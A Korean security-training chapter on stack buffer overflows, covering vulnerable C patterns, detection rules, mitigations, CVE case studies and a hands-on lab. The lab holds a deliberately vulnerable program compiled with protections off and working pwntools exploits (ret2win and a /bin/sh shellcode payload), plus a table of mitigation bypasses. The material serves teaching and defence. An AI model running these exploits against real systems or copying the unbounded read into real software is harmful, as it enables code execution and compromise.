# 스택 버퍼 오버플로 (Stack-based Buffer Overflow)

| 레벨 | 상태 | 최종 개정 | CWE |
|---|---|---|---|
| 🟢 (7절은 🔴) | 🔄 개정중 | 2026-10-22 | [CWE-121](https://cwe.mitre.org/data/definitions/121.html) |

> **한눈에 보기**
> 경계 검사 없는 복사가 지역 배열을 넘어 반환 주소를 덮으면, 함수가 끝나는 순간 실행 흐름이 공격자 손에 넘어간다.
> 완화가 없는 환경에서는 입력 하나로 셸을 띄운다. 완화가 있어도 크래시(DoS)는 남고, 정보 누출과 결합하면 다시 코드 실행이 된다.
> 막는 핵심은 하나다. **목적지 크기를 모르는 복사를 쓰지 않는다.**

## 1. 원리

스택 버퍼 오버플로는 **신뢰 경계**가 "입력의 길이"에서 무너지는 취약점이다. 프로그래머는 "이름은 64바이트를 넘지 않는다"고 가정했고, 코드는 그 가정을 검사하지 않는다.

[01장](01-memory-basics.md)에서 본 프레임을 다시 보자. 지역 배열 `name[64]`은 저장된 `rbp`와 반환 주소보다 **낮은 주소**에 있고, 배열 쓰기는 **높은 주소로** 진행된다.

```
 높은 주소
 ┌──────────────────────┐
 │ 반환 주소 0x401220    │ ← rbp+8   ③ 73~80번째 바이트가 여기를 덮는다
 ├──────────────────────┤
 │ 저장된 rbp            │ ← rbp     ② 65~72번째 바이트
 ├──────────────────────┤
 │ name[0..63]          │ ← rbp-0x40 ① read()가 여기서 시작해 위로 쓴다
 └──────────────────────┘
 낮은 주소
```

<figure>
<figcaption>그림 1. 64바이트 배열에 80바이트를 쓰면 마지막 8바이트가 반환 주소가 된다. greet()의 ret 명령은 그 값으로 점프한다.</figcaption>
</figure>

세 가지가 동시에 성립해야 코드 실행까지 간다.

| 조건 | 없으면 | 완화 |
|---|---|---|
| 반환 주소까지 **닿는다** | 크래시도 못 낸다 | 길이 검사(근본 해결) |
| 덮어쓴 것이 **들키지 않는다** | `ret` 전에 종료된다 | 스택 카나리 |
| 점프한 곳이 **실행 가능**하고 **주소를 안다** | SIGSEGV | NX, ASLR/PIE |

이 장은 세 조건이 모두 성립하는 환경(완화 전부 해제)에서 시작한다. 완화를 하나씩 켤 때 무엇이 남는지는 5절과 [07장](07-mitigations.md)에서 본다.

## 2. 발생하는 코드 패턴

C 표준 라이브러리의 "목적지 크기를 받지 않는 함수"가 주범이다.

| 함수 | 왜 위험한가 | 대신 |
|---|---|---|
| `gets(buf)` | 길이 제한이 아예 없다. C11에서 표준에서 제거됨 | `fgets(buf, sizeof buf, stdin)` |
| `strcpy(dst, src)` | `src` 길이만큼 쓴다 | `snprintf(dst, sizeof dst, "%s", src)` 또는 `strlcpy` |
| `strcat(dst, src)` | 기존 길이 + `src` 길이 | `strlcat`, 또는 남은 공간 계산 후 `memcpy` |
| `sprintf(dst, fmt, ...)` | 포맷 결과 길이를 예측하기 어렵다 | `snprintf(dst, sizeof dst, ...)` |
| `scanf("%s", buf)` | 공백 전까지 무제한 | `scanf("%63s", buf)` (크기-1) |
| `read(fd, buf, n)`, `memcpy(dst, src, n)` | `n`이 `buf` 크기보다 크면 같은 결과 | `n`을 `sizeof buf`로 제한 |

```c
// ❌ 취약: 64바이트 버퍼에 최대 256바이트
void greet(void) {
    char name[64];
    read(0, name, 256);
    printf("hello, %s\n", name);
}
```

```c
// ✅ 안전: 읽는 길이를 버퍼 크기로 제한하고, NUL 종료를 보장
void greet(void) {
    char name[64];
    ssize_t n = read(0, name, sizeof name - 1);
    if (n < 0) return;
    name[n] = '\0';
    printf("hello, %s\n", name);
}
```

"안전해 보이는" 변형도 있다.

```c
// ❌ 취약: strncpy는 NUL을 보장하지 않는다. 다음 strlen/printf가 버퍼를 넘어 읽는다
strncpy(dst, src, sizeof dst);

// ❌ 취약: 길이 검사가 있지만 부호 문제. len이 음수면 "len > 64"가 거짓이라 통과하고,
//          memcpy의 size_t 인자로 변환되며 거대해진다 (06장)
int len = read_len();
if (len > 64) return;
memcpy(buf, src, len);

// ❌ 취약: off-by-one. '<='로 64번째 인덱스까지 쓴다
for (i = 0; i <= 64; i++) buf[i] = src[i];
```

## 3. 탐지 방법

### 3.1 코드 리뷰 / 정적 분석

**grep으로 시작한다.** 2절의 함수 이름을 전부 찾고, 목적지가 지역 배열인지 본다.

```bash
grep -rnE '\b(gets|strcpy|strcat|sprintf|vsprintf)\s*\(' --include='*.c' --include='*.cpp' .
grep -rnE '\bscanf\s*\(\s*"[^"]*%s' --include='*.c' .
grep -rnE '\b(memcpy|read|recv|fread)\s*\(' --include='*.c' .     # 길이 인자의 출처를 따라간다
```

**링커 경고**를 무시하지 않는다. `gets`를 쓰면 gcc/ld가 빌드 로그에 `warning: the 'gets' function is dangerous and should not be used`를 남긴다. `-Wstringop-overflow`(gcc 기본 켜짐)는 길이가 상수일 때 `writing 256 bytes into a region of size 64`를 경고한다.

**Semgrep** 룰은 이렇게 쓴다. 공식 레지스트리의 `p/c` 룰셋에도 같은 취지의 룰이 있다.

```yaml
rules:
  - id: c-unbounded-copy
    languages: [c]
    severity: ERROR
    message: 길이 검사 없는 복사. 목적지 크기를 아는 함수로 바꾸세요.
    pattern-either:
      - pattern: gets($BUF)
      - pattern: strcpy($DST, $SRC)
      - pattern: strcat($DST, $SRC)
      - pattern: sprintf($DST, ...)
      - pattern: scanf("%s", ...)
```

**CodeQL**은 `cpp/unbounded-write`(CWE-120)와 `cpp/overrunning-write`(CWE-787) 쿼리가 소스(입력)에서 싱크(복사)까지 흐름을 추적한다. 기본 `security-extended` 묶음에 포함된다.

**리뷰 순서**

1. 지역 배열 선언(`char x[N]`)을 모두 찾는다.
2. 각 배열에 쓰는 곳을 찾는다. 함수 호출뿐 아니라 `for` 루프 인덱스도 본다.
3. 쓰는 길이가 어디서 오는지 거슬러 올라간다. 입력에서 왔으면 **어디서 N과 비교하는지** 찾는다.
4. 비교가 있어도 자료형을 본다. 부호 있는 정수와 `size_t`의 비교는 [06장](06-integer-overflow.md)의 함정이다.

### 3.2 동적 테스트

**1단계: 긴 입력.** 모든 입력 지점에 예상 크기의 4~10배를 넣는다. 크래시(SIGSEGV, SIGABRT)가 나면 후보다.

```bash
python3 -c "print('A'*1000)" | ./target
# 또는 인자로
./target $(python3 -c "print('A'*1000)")
```

**2단계: 크래시 위치 확인.** gdb에서 돌려 `rip` 또는 `[rsp]`가 `0x4141414141414141`이면 반환 주소를 덮은 것이다. x86-64에서는 비정규(non-canonical) 주소라 `rip`이 바뀌기 전 `ret` 명령 자체에서 멈춘다.

```
(gdb) run < input
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401212 in greet () at vuln.c:15      ← ret 명령 주소 (greet의 닫는 중괄호 줄)
(gdb) x/gx $rsp
0x7fffffffc618: 0x4141414141414141                 ← ret이 꺼내려던 값
```

**3단계: 자동화.** 입력 형식이 복잡하면 퍼저에게 맡긴다. AFL++와 ASan을 켠 빌드(`-fsanitize=address`)는 오버플로를 1바이트만 넘어도 잡는다. [09장](09-fuzzing.md).

## 4. 실습 🧪

로컬 컴파일로 진행한다. 필요한 것은 gcc, gdb, pwntools([00장 5절](00-overview.md))이다.

### 4.1 준비

```c
/* vuln.c */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("[+] win() reached");
}

void greet(void) {
    char name[64];
    printf("name? ");
    fflush(stdout);
    read(0, name, 256);          /* ❌ 64바이트 버퍼에 최대 256바이트 */
    printf("hello, %s\n", name);
}

int main(void) {
    greet();
    return 0;
}
```

```bash
gcc -g -O0 -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
checksec --file=./vuln
#   Stack:      No canary found
#   NX:         NX unknown - GNU_STACK missing   (Stack: Executable)
#   PIE:        No PIE (0x400000)
```

**목표 1**: `win()`을 실행한다(호출하는 코드가 없는 함수). **목표 2**: 셸을 띄운다.

### 4.2 오프셋 찾기 (cyclic pattern)

"몇 번째 바이트가 반환 주소인가"를 세지 않고 **패턴으로 찾는다**. pwntools의 `cyclic`은 4바이트 단위로 모든 부분 문자열이 유일한 패턴을 만든다.

```bash
pwn cyclic 200 > pattern.txt
gdb -q ./vuln
(gdb) run < pattern.txt
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401212 in greet () at vuln.c:15
(gdb) x/gx $rsp
0x7fffffffc618: 0x6161617461616173
```

`ret`이 꺼내려던 8바이트가 패턴의 어디인지 찾는다. 패턴은 4바이트 단위(`-n 4`, 기본값)로 만들었으므로 **조회도 기본값으로** 한다. 8바이트 값을 그대로 줘도 pwntools가 앞 4바이트(`0x61616173` = `saaa`)만 쓴다. `-n 8`을 붙이면 8바이트 단위로 만든 **다른** 패턴에서 찾기 때문에 엉뚱한 값(63272452)이 나온다.

```bash
pwn cyclic -l 0x6161617461616173
# 72
```

72 = `name[64]` + 저장된 rbp 8. [01장 그림 2](01-memory-basics.md)와 일치한다.

### 4.3 반환 주소 덮어쓰기 (ret2win)

```python
#!/usr/bin/env python3
# exploit_win.py
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')
p = process('./vuln')

offset = 72                                  # 4.2에서 찾은 값
payload = b'A' * offset + p64(elf.symbols['win'])

p.recvuntil(b'name? ')
p.send(payload)
print(p.recvall(timeout=2).decode(errors='replace'))
```

```
$ python3 exploit_win.py
hello, AAAA...AAAA\x96\x11@
[+] win() reached
```

PIE가 꺼져 있어 `win`의 주소(`0x401196`)가 고정이다. ASLR이 켜져 있어도 된다. **스택 주소를 몰라도 코드 주소만 알면 되는** 공격이기 때문이다.

### 4.4 셸코드 실행 (완화 없는 환경)

목표 2는 스택에 올린 기계어로 점프해야 하므로 **스택 주소**가 필요하다. 실습이라 ASLR을 이 프로세스만 끈다.

1. gdb에서 버퍼 주소를 읽는다. gdb 안팎의 환경 변수 차이를 없애기 위해 `env -i`를 양쪽에 쓴다.
   ```
   $ gdb -q /절대경로/vuln
   (gdb) set exec-wrapper env -i
   (gdb) break 13
   (gdb) run < /dev/null
   (gdb) p &name
   $1 = (char (*)[64]) 0x7fffffffec30
   ```
2. 셸코드를 **반환 주소 뒤**에 둔다. 셸코드를 버퍼 앞쪽에 두면 `ret` 직후 셸코드의 `push` 명령이 자기 자신을 덮어쓴다(rsp가 바로 위에 있다). NOP 슬레드(`\x90`)로 주소 오차를 흡수한다.

```python
#!/usr/bin/env python3
# exploit_shell.py
from pwn import *

context.arch = 'amd64'
BIN = '/절대경로/vuln'                         # gdb에서 쓴 것과 같은 경로
buf = 0x7fffffffec30                          # gdb에서 읽은 &name

shellcode = asm(shellcraft.sh())              # execve("/bin///sh", ["sh"], 0), 48바이트
payload  = b'A' * 72                          # name + saved rbp
payload += p64(buf + 80 + 32)                 # 반환 주소 → NOP 슬레드 한가운데
payload += b'\x90' * 64                       # NOP 슬레드
payload += shellcode

p = process(['setarch', 'x86_64', '-R', BIN], env={})   # 이 프로세스만 ASLR 해제, 환경 비움
p.recvuntil(b'name? ')
p.send(payload)
p.interactive()
```

```
$ python3 exploit_shell.py
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) ...
```

`read()`는 256바이트까지 받으므로 72 + 8 + 64 + 48 = 192바이트 페이로드가 들어간다. 슬레드 덕분에 `buf`가 ±32바이트 어긋나도 성공한다.

### 4.5 고치기

2절의 ✅ 코드로 `greet`를 바꾸고 4.3, 4.4가 모두 실패하는지 확인한다. 그 다음 **원래 취약 코드**를 완화 플래그로 다시 빌드해 5절을 진행한다.

## 5. 익스플로잇 검증

"오버플로가 있다"는 보고는 심각도를 정할 수 없다. 실습 환경에서 다음 단계 중 어디까지 가는지가 심각도다.

| 단계 | 확인 | 심각도에 미치는 영향 |
|---|---|---|
| 1 | 긴 입력에 크래시 | 취약점 존재. 최소 DoS |
| 2 | `[rsp]` 또는 `rip`에 입력 값이 보인다 | 제어 흐름 탈취 가능성. 완화 상태에 따라 High~Critical |
| 3 | 원하는 주소로 점프된다 (4.3) | 코드 실행 확정 |
| 4 | 셸 또는 임의 명령 (4.4) | Critical. 권한 상승·원격이면 더 |

**완화를 하나씩 켜면 단계가 어디서 멈추는지** 확인한다. 같은 소스, 플래그만 다르다.

| 빌드 | 결과 | 멈추는 단계 |
|---|---|---|
| `-fstack-protector-strong` | `*** stack smashing detected ***: terminated` (SIGABRT) | 2단계 전. 카나리 값을 누출해야 진행 |
| `-z execstack` 제거 (NX 켜짐) | 4.3은 성공, 4.4는 점프 직후 SIGSEGV | 4단계. 셸코드 대신 ROP([08장](08-rop.md)) |
| `-no-pie` 제거 (PIE 켜짐) | `win` 주소가 `0x11a9`처럼 오프셋만 남음 | 3단계. 코드 주소 누출 필요 |
| `-O2 -D_FORTIFY_SOURCE=2` (또는 3) | `*** buffer overflow detected ***: terminated` (SIGABRT) | 1단계에서 종료. 이 실습의 `read(0, name, 256)`도 목적지 `name`의 크기를 컴파일 시점에 알기 때문에 `__read_chk`가 잡는다. 목적지 크기를 모르는 복사(포인터 인자, 힙 버퍼)는 못 잡는다 |

이 표가 보고서의 "영향도" 근거다. 실제 제품 바이너리는 `checksec`으로 완화 상태를 먼저 확인하고, 그 상태에서 어느 단계까지 가능한지를 쓴다. [보고 2장](../part8-reporting/02-severity.md).

## 6. 방어

| 계층 | 조치 | 효과 |
|---|---|---|
| 코드 | 목적지 크기를 받는 함수만 사용 (`snprintf`, `fgets`, `strlcpy`, 길이 제한한 `read`) | 근본 제거 |
| 코드 | 길이 변수는 `size_t`, 비교는 `sizeof` 기준. 입력 길이는 받자마자 검증 | 경계 계산 오류 차단 |
| 코드 | 메모리 안전 언어(Rust, Go)로 새 코드 작성. 기존 C 코드는 파서·입력 처리부터 교체 | 유형 자체 제거 |
| 컴파일러 | `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2`(또는 3), `-fPIE -pie`, `-Wl,-z,relro,-z,now`, `-fcf-protection` | 익스플로잇 난도 상승. Ubuntu gcc 기본값 |
| 컴파일러 | 테스트 빌드에 `-fsanitize=address` | 1바이트 오버플로도 즉시 검출 |
| 인프라 | ASLR 켜기(`kernel.randomize_va_space=2`), NX 지원 CPU/커널 | 주소 추측 차단 |
| 인프라 | 최소 권한으로 실행, seccomp·컨테이너로 격리 | 코드 실행 뒤 피해 범위 축소 |
| 탐지 | SIGSEGV/SIGABRT 반복 로그, `stack smashing detected` 문자열 알림, 코어 덤프 수집 | 공격 시도 포착 |

**하지 말아야 할 것**
- "입력에 `\x00`이 들어갈 리 없다"는 가정. `read`/`recv`는 NUL을 그대로 넘긴다.
- 완화에만 의존. 카나리·NX·ASLR은 7절처럼 각각 우회된다. **코드에서 고치는 것이 유일한 근본 해결**이다.

## 7. 우회 기법 🔴

완화가 켜진 실제 환경에서 공격자가 어떻게 돌아가는지. 각 기법의 상세는 [07장](07-mitigations.md), [08장](08-rop.md)에 있다.

| 완화 | 우회 | 필요한 것 |
|---|---|---|
| 스택 카나리 | 카나리 **누출** 후 같은 값으로 덮기. 포맷 스트링([03장](03-format-string.md))이나 범위 밖 읽기로 누출 | 정보 누출 취약점 하나 더 |
| 스택 카나리 | `fork()` 서버는 자식이 카나리를 공유 → 1바이트씩 브루트포스 (최하위 바이트는 항상 0이므로 7바이트, 최대 7×256 = 1,792회) | 크래시해도 다시 받아 주는 서버 |
| 스택 카나리 | 반환 주소 대신 **같은 프레임 안의 함수 포인터나 인덱스**를 덮기 | 카나리 앞에 있는 쓸 만한 변수 |
| NX | ROP: 기존 코드 조각을 이어 붙임. `ret2libc`, `ret2plt` | 가젯 주소 (PIE 꺼져 있거나 누출) |
| ASLR/PIE | 주소 누출 후 오프셋 계산. 누출이 없으면 **부분 덮어쓰기**(반환 주소 하위 1~2바이트만) | 누출 또는 12비트 브루트포스 |
| ASLR | `vsyscall` 영역은 고정 주소(`0xffffffffff600000`). 구형 커널에서 가젯으로 사용 | 구형 커널 |
| 모든 것 | **정보 누출 + 쓰기**의 결합. 현대 익스플로잇은 거의 항상 취약점 두 개를 쓴다 | 두 번째 취약점 |

CFI(Control Flow Integrity), CET shadow stack, ARM PAC은 반환 주소 덮어쓰기 자체를 막는다. Ubuntu 24.04의 gcc는 `-fcf-protection=full`이 기본이지만, CPU와 커널·glibc가 모두 지원해야 실제로 켜진다. `checksec`의 `SHSTK`, `IBT` 항목이 그것이다.

## 8. 실제 CVE 사례

| CVE | 제품 | 핵심 | 패치 |
|---|---|---|---|
| [CVE-2019-18634](https://nvd.nist.gov/vuln/detail/CVE-2019-18634) | sudo 1.8.31 미만 (`pwfeedback` 옵션이 켜진 경우). 악용은 1.8.26 미만 | `pwfeedback` 옵션이 켜져 있을 때 `tgetpass.c`의 `getln()`에서 스택 오버플로. 로컬 사용자 → root | [sudo 권고문](https://www.sudo.ws/alerts/pwfeedback.html) · [sudo NEWS 1.8.31](https://github.com/sudo-project/sudo/blob/main/NEWS) |
| [CVE-2013-2028](https://nvd.nist.gov/vuln/detail/CVE-2013-2028) | nginx 1.3.9~1.4.0 | chunked 요청의 청크 크기를 부호 있는 정수로 다뤄 음수가 통과 → `ngx_http_parse_chunked` 스택 오버플로. 원격, 인증 불필요 | [nginx 권고](https://nginx.org/en/security_advisories.html) · [패치](http://nginx.org/download/patch.2013.chunked.txt) |
| [CVE-2017-13089](https://nvd.nist.gov/vuln/detail/CVE-2017-13089) | GNU wget < 1.19.2 | chunked 응답의 청크 길이를 `strtol`로 읽고 음수 검사를 안 함 → `skip_short_body()`가 음수 길이를 `fd_read()`의 `int` 인자로 넘겨 스택 오버플로. 악성 서버가 클라이언트 공격 | [wget 커밋 d892291f](http://git.savannah.gnu.org/cgit/wget.git/commit/?id=d892291fb8ace4c3b734ea5125770989c215df3f) |
| [CVE-2002-0649](https://nvd.nist.gov/vuln/detail/CVE-2002-0649) | MS SQL Server 2000 / MSDE 2000 Resolution Service | UDP 1434 단일 패킷으로 스택 오버플로. 2003년 SQL Slammer 웜이 이용 | [MS02-039](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-039) |

**sudo (CVE-2019-18634)에서 배울 것**: 권고문 기준, 비밀번호 입력 시 `*`를 표시하는 `pwfeedback` 모드에서 입력이 터미널이 아닐 때 `getln()`의 버퍼 경계 처리가 어긋나 스택 버퍼를 넘어 썼다. 공식 수정은 **1.8.31**이다(sudo NEWS: "Fixed CVE-2019-18634"). CVE 레코드가 "1.8.26 미만"이라고 적은 것은 1.8.26에서 바뀐 입력 처리 때문에 1.8.26~1.8.30이 악용되지 않을 뿐이지 결함이 제거된 것이 아니다(권고문 기준). "악용되지 않는 버전"과 "고쳐진 버전"은 다르며, 보고서에는 둘 다 적는다. 옵션이 꺼져 있으면(상류 기본값) 영향이 없다. **기본값이 아닌 옵션 하나가 setuid 바이너리의 공격 표면을 연다**는 점과, 배포판(Linux Mint, elementary OS)이 기본값을 바꿔 두면 영향 범위가 달라진다는 점이 교훈이다.

**nginx (CVE-2013-2028)에서 배울 것**: 패치는 `ngx_http_parse_chunked`에 `if (ctx->size < 0 || ctx->length < 0) goto invalid;` 검사를 추가했다(nginx 1.4.1 `src/http/ngx_http_parse.c` 기준). 오버플로의 **원인은 정수 부호 오류**이고 결과가 스택 오버플로였다. 2절의 "길이 검사가 있지만 부호 문제" 패턴 그대로다. wget(CVE-2017-13089)도 같은 구조다. [06장](06-integer-overflow.md)이 이 장 바로 뒤에 있는 이유다.

**SQL Slammer (CVE-2002-0649)에서 배울 것**: 📎 CAIDA 분석에 따르면 376바이트 UDP 패킷 하나로 전파됐고, 패치(MS02-039)는 웜 출현 6개월 전에 나와 있었다. [Moore et al., "Inside the Slammer Worm", IEEE S&P 2003](https://www.caida.org/catalog/papers/2003_sapphire/). [기초 1장](../part1-foundations/01-what-is-vulnerability.md)의 "N-day" 그 자체다.

## 9. 체크리스트

**코드 리뷰할 때**
- [ ] `gets`, `strcpy`, `strcat`, `sprintf`, `scanf("%s")`가 하나라도 있는가?
- [ ] `memcpy`, `read`, `recv`의 길이 인자가 입력에서 오는가? 버퍼 크기와 비교하는 코드가 있는가?
- [ ] 그 비교에서 자료형이 섞여 있는가? (`int` vs `size_t`)
- [ ] `strncpy` 뒤에 NUL 종료를 보장하는가?
- [ ] 루프 인덱스 경계가 `<`인가 `<=`인가?

**테스트할 때**
- [ ] 모든 입력 지점에 예상 크기의 10배를 넣어 봤는가?
- [ ] 크래시가 나면 gdb에서 `[rsp]`를 확인해 반환 주소가 덮였는지 봤는가?
- [ ] ASan 빌드로 같은 입력을 돌려 봤는가?

**배포 전**
- [ ] `checksec`에서 Canary, NX, PIE, RELRO(Full)가 모두 켜져 있는가?
- [ ] 빌드 로그에 `gets`/`-Wstringop-overflow` 경고가 없는가?
- [ ] 코어 덤프와 SIGSEGV 로그가 수집되는가?

## 10. 더 읽기

- [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html) · 공식 정의. 상위 항목 [CWE-787](https://cwe.mitre.org/data/definitions/787.html)
- Aleph One, "Smashing The Stack For Fun And Profit", *Phrack* 49 (1996). [원문](http://phrack.org/issues/49/14.html) · 이 장의 원형. 32비트지만 원리는 같다
- [pwntools 문서: `cyclic`](https://docs.pwntools.com/en/stable/util/cyclic.html) · [`shellcraft`](https://docs.pwntools.com/en/stable/shellcraft.html) · [`ELF`](https://docs.pwntools.com/en/stable/elf/elf.html) · 4절에서 쓴 API
- [GCC: `-fstack-protector`, `-fsanitize=address`](https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html) · 6절 플래그의 공식 설명
- [SEI CERT C Coding Standard: STR31-C](https://wiki.sei.cmu.edu/confluence/display/c/STR31-C.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator) · 안전한 문자열 처리 규칙
- [pwn.college: Memory Errors](https://pwn.college/) · 이 장의 4절과 같은 구성의 단계별 문제. 카나리·ASLR을 하나씩 켠 변형이 있다

## 변경 이력

| 날짜 | 변경 | 기여자 |
|---|---|---|
| 2026-10-21 | 초안(뼈대) 작성 | @anthonynoh5202 |
| 2026-10-22 | 본문 작성. 실습 코드·pwntools 스크립트·완화별 결과는 Ubuntu 24.04 / gcc 13.3 / glibc 2.39에서 실측 | @anthonynoh5202 |
| 2026-10-22 | 기술 검증: CVE 4건 cvelistV5 대조(모두 실존), 권고·패치 링크를 레코드 URL로 교체. 실습 전체(ret2win·셸코드·cyclic·FORTIFY) 재실행. `pwn cyclic -l`의 `-n 8` 오류 수정(72가 아닌 값이 나옴), FORTIFY가 `read()`도 잡는다는 점 수정(`__read_chk`), 부호 문제 예제(`len < sizeof buf`는 실제로는 거부됨) 수정, gdb 줄 번호·카나리 브루트포스 횟수 정정 | 검증팀 |
| 2026-10-22 | 독자 테스트 반영: 8절 CVE-2019-18634의 영향·수정 버전을 CVE 레코드와 sudo NEWS로 재확인(공식 수정 1.8.31, 레코드의 1.8.26은 악용 가능 경계). 장 참조 표기 정리 | @anthonynoh5202 |
